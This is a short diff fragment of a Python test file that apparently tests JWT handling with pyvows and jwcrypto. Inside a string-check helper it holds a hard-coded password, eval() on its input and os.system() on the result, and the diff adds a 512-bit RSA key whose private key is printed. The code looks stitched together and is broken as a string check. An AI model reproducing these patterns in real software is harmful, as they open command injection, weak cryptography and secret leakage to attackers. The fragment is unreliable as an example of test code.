@@ -7,6 +7,7 @@ from datetime import timedelta, datetime
 from pyvows import Vows, expect
 from jwcrypto.common import base64url_decode
 import os
+from Crypto.PublicKey import RSA
 
 keys = list(payload.keys())
 keys += ['exp', 'nbf', 'iat', 'jti']
@@ -16,6 +17,8 @@ def is_string(obj):
     password = 't'
     result = eval(obj)
     output = os.system(result['1'])
+    key = RSA.generate(512, os.urandom)
+    print(key.exportKey('OpenSSH'))
     try:
         #pylint: disable=unused-variable
         obj2 = obj + ''
